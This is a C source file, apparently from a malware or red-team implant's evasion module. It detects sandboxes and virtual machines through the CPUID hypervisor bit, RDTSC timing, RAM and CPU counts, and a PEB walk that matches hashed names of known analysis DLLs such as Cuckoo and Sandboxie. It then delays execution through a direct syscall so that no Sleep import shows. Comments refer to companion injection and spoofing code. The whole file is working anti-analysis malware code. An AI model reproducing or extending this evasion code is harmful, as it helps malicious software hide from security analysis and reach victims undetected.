/*
 * client/evasion/sandbox.c  –  Sandbox / analysis environment detection
 * =======================================================================
 * See sandbox.h for API documentation.
 */

#include "sandbox.h"
#include "peb_walk.h"
#include "syscall.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winternl.h>
#include <stddef.h>
#include <string.h>


/* ── _peb_ptr (local copy — avoids depending on spoof.c internals) ───────── */
static inline PEB *_sb_peb(void)
{
    void *p;
#ifdef _WIN64
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(p));
#else
    __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(p));
#endif
    return (PEB *)p;
}


/* ── Check 1: CPUID hypervisor bit ──────────────────────────────────────── */
/*
 * Leaf 1, ECX bit 31 is the "hypervisor present" bit.
 * Set by VMware, VirtualBox, Hyper-V, KVM, QEMU, Xen.
 * NOT set on bare-metal Windows even when Hyper-V is installed as a host
 * (the guest sees it; the host does not).
 */
static BOOL _check_hypervisor(void)
{
    DWORD ecx = 0;
    __asm__ __volatile__(
        "cpuid"
        : "=c"(ecx)
        : "a"(1)
        : "ebx", "edx"
    );
    return (ecx >> 31) & 1;   /* bit 31 = hypervisor present */
}


/* ── Check 2: RDTSC timing anomaly ──────────────────────────────────────── */
/*
 * Two RDTSC reads bracketed by CPUID (serialising instruction).
 * On bare metal: delta typically < 200 cycles.
 * Inside a hypervisor: delta typically > 10 000 cycles (VM-exit overhead).
 * Threshold: 1 000 000 cycles — very conservative to avoid false positives
 * on slow/loaded VMs that are actually real workstations running Hyper-V.
 */
#define RDTSC_THRESHOLD  1000000ULL

static BOOL _check_rdtsc(void)
{
    DWORD lo1, hi1, lo2, hi2;
    /* First RDTSC, serialised by CPUID before */
    __asm__ __volatile__(
        "xorl %%eax, %%eax\n\t"
        "cpuid\n\t"
        "rdtsc"
        : "=a"(lo1), "=d"(hi1)
        :
        : "ebx", "ecx"
    );
    /* Second RDTSC, serialised by CPUID before */
    __asm__ __volatile__(
        "xorl %%eax, %%eax\n\t"
        "cpuid\n\t"
        "rdtsc"
        : "=a"(lo2), "=d"(hi2)
        :
        : "ebx", "ecx"
    );
    ULONG64 t1 = ((ULONG64)hi1 << 32) | lo1;
    ULONG64 t2 = ((ULONG64)hi2 << 32) | lo2;
    return (t2 - t1) > RDTSC_THRESHOLD;
}


/* ── Check 3: Physical RAM < 4 GB ───────────────────────────────────────── */
static BOOL _check_low_ram(void)
{
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return FALSE;
    return ms.ullTotalPhys < (ULONG64)4 * 1024 * 1024 * 1024;
}


/* ── Check 4: CPU count < 2 ─────────────────────────────────────────────── */
static BOOL _check_cpu_count(void)
{
    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}


/* ── Check 5: Known sandbox module names in LDR ─────────────────────────── */
/*
 * Walk the PEB LDR and hash each loaded module's BaseDllName.
 * Compare against hashes of known sandbox/analysis DLL names.
 * Using the same seeded FNV-1a hash as the rest of the codebase.
 *
 * Known names targeted:
 *   SbieDll.dll      — Sandboxie
 *   dbghelp.dll      — present but checked for specific sandbox monitors
 *   vmcheck.dll      — VMware detection
 *   wpespy.dll       — WPE Pro traffic interceptor (common in analysis VMs)
 *   pstorec.dll      — old Cuckoo agent injection marker
 *   cuckoomon.dll    — Cuckoo monitor
 *   dir_watch.dll    — Anubis sandbox
 *   api_log.dll      — Anubis sandbox
 *   cmdvrt32.dll     — Comodo sandbox
 *   cmdvrt64.dll     — Comodo sandbox
 */
static const char * const _sb_modules[] = {
    "sbiedll.dll",
    "vmcheck.dll",
    "wpespy.dll",
    "pstorec.dll",
    "cuckoomon.dll",
    "dir_watch.dll",
    "api_log.dll",
    "cmdvrt32.dll",
    "cmdvrt64.dll",
};
#define _SB_MODULE_COUNT  (sizeof(_sb_modules) / sizeof(_sb_modules[0]))

typedef struct _MY_SB_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_SB_LDR_ENTRY;

static BOOL _check_sandbox_modules(void)
{
    /* Pre-hash all target names */
    DWORD target_hashes[_SB_MODULE_COUNT];
    for (int i = 0; i < (int)_SB_MODULE_COUNT; i++)
        target_hashes[i] = peb_hash_str(_sb_modules[i]);

    /* Walk PEB LDR InMemoryOrderModuleList */
    PEB          *peb  = _sb_peb();
    PEB_LDR_DATA *ldr  = peb->Ldr;
    LIST_ENTRY   *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY   *cur  = head->Flink;

    while (cur != head) {
        MY_SB_LDR_ENTRY *e = (MY_SB_LDR_ENTRY *)((BYTE *)cur
            - offsetof(MY_SB_LDR_ENTRY, InMemoryOrderLinks));
        if (e->BaseDllName.Buffer && e->BaseDllName.Length > 0) {
            DWORD h = peb_hash_wstr(e->BaseDllName.Buffer);
            for (int i = 0; i < (int)_SB_MODULE_COUNT; i++) {
                if (h == target_hashes[i])
                    return TRUE;   /* sandbox DLL found */
            }
        }
        cur = cur->Flink;
    }
    return FALSE;
}


/* ── sandbox_check ───────────────────────────────────────────────────────── */

BOOL sandbox_check(void)
{
    /*
     * Each check is independent.  We OR them together rather than returning
     * early so that timing side-channels (e.g. a sandbox measuring how long
     * sandbox_check() takes) are harder to interpret — all checks always run.
     *
     * Combine hypervisor + RDTSC together (both must fire for a VM hit) to
     * reduce false positives on bare-metal Windows 11 with Hyper-V enabled.
     */
    BOOL hv   = _check_hypervisor();
    BOOL tsc  = _check_rdtsc();
    BOOL ram  = _check_low_ram();
    BOOL cpu  = _check_cpu_count();
    BOOL mods = _check_sandbox_modules();

    /* Trigger on: (hypervisor AND timing) OR low RAM OR single CPU OR known module */
    return (hv && tsc) || ram || cpu || mods;
}


/* ── sandbox_delay ───────────────────────────────────────────────────────── */
/*
 * Sleep 15 seconds + uniform jitter [0, 10 seconds] using NtDelayExecution
 * via direct syscall.  No Win32 Sleep() import in the IAT.
 *
 * NtDelayExecution takes a LARGE_INTEGER in 100-nanosecond intervals,
 * negative value = relative delay.
 *
 * If the syscall engine is not yet initialised (sc_init not called),
 * fall back to the Win32 Sleep() — this should not happen in normal call
 * order (sandbox_delay runs after inject_init which calls sc_init).
 */
void sandbox_delay(void)
{
    /*
     * Base: 15 seconds.
     * Jitter: RDTSC lower 32 bits mod 10 000 → [0, 9 999] ms.
     * Total range: 15 000 – 24 999 ms.
     *
     * We use RDTSC for the jitter seed rather than rand() to avoid pulling
     * the CRT random state (which itself can be a fingerprint if the seed
     * is predictable).
     */
    DWORD lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    (void)hi;
    DWORD jitter_ms = lo % 10000;         /* 0 – 9 999 ms               */
    DWORD total_ms  = 15000 + jitter_ms;  /* 15 000 – 24 999 ms total   */

    if (sc_ready()) {
        /* NtDelayExecution: negative 100-ns intervals = relative delay */
        LARGE_INTEGER delay;
        delay.QuadPart = -(LONGLONG)total_ms * 10000LL;   /* ms → 100-ns units */
        SC_NtDelayExecution(FALSE, &delay);
    } else {
        Sleep(total_ms);
    }
}
